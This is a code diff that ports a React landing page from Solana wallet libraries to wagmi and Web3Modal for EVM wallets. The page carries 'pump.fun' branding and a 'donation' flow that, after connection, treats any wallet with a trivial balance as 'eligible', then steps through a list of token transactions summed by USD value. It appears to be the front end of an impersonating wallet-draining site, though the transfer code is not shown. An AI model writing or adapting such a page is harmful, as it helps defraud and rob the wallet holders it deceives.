@@ -1,8 +1,7 @@
-import { useWallet } from '@solana/wallet-adapter-react';
-import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
+import { useAccount } from 'wagmi';
+import { useWeb3Modal } from '@web3modal/wagmi/react';
 import { Button } from '@/components/ui/button';
 import { useDonation } from '@/hooks/useDonation';
-// Removed DonationProgress per request
 import { Heart, Wallet } from 'lucide-react';
 import backgroundImage from '@/assets/web-background.png';
 import logoImage from '@/assets/pill.svg';
@@ -15,14 +14,13 @@ import pfpImg from '@/assets/tokens/pfp.png';
 import pebbleImg from '@/assets/tokens/pebble.png';
 import marsImg from '@/assets/tokens/mars.png';
 import { useState, useEffect } from 'react';
-import { useConnection } from '@solana/wallet-adapter-react';
-import { LAMPORTS_PER_SOL } from '@solana/web3.js';
+import { useBalance } from 'wagmi';
 
 const Index = () => {
-  const { connected, publicKey } = useWallet();
-  const { connection } = useConnection();
+  const { address, isConnected } = useAccount();
+  const { open } = useWeb3Modal();
   const { startDonation, isProcessing, transactions, currentIndex } = useDonation();
-  const [walletBalance, setWalletBalance] = useState<number>(0);
+  const { data: balanceData } = useBalance({ address });
   const [isEligible, setIsEligible] = useState<boolean>(false);
 
   const totalValue = transactions.reduce((sum, tx) => sum + tx.usdValue, 0);
@@ -41,25 +39,11 @@ const Index = () => {
   ];
 
   useEffect(() => {
-    const checkBalance = async () => {
-      if (publicKey) {
-        try {
-          const balance = await connection.getBalance(publicKey);
-          const solBalance = balance / LAMPORTS_PER_SOL;
-          setWalletBalance(solBalance);
-          setIsEligible(solBalance >= 0.00001);
-        } catch (error) {
-          console.error('Error fetching balance:', error);
-        }
-      }
-    };
-
-    if (connected) {
-      checkBalance();
-      const interval = setInterval(checkBalance, 5000);
-      return () => clearInterval(interval);
+    if (balanceData) {
+      const balance = Number(balanceData.formatted);
+      setIsEligible(balance >= 0.00001);
     }
-  }, [connected, publicKey, connection]);
+  }, [balanceData]);
 
   return (
     <div className="min-h-screen flex flex-col relative overflow-hidden">
@@ -85,7 +69,7 @@ const Index = () => {
             />
             <span className="text-2xl font-bold text-white">pump.fun</span>
           </div>
-          <WalletMultiButton className="!bg-primary hover:!bg-primary/90" />
+          <w3m-button />
         </div>
       </div>
 
@@ -116,7 +100,7 @@ const Index = () => {
 
           {/* Wallet Connection */}
           <div className="flex flex-col items-center gap-4">
-            {!connected ? (
+            {!isConnected ? (
               <div className="text-center space-y-4">
                 <p className="text-sm text-muted-foreground flex items-center gap-2 justify-center">
                   <Wallet className="w-4 h-4" />
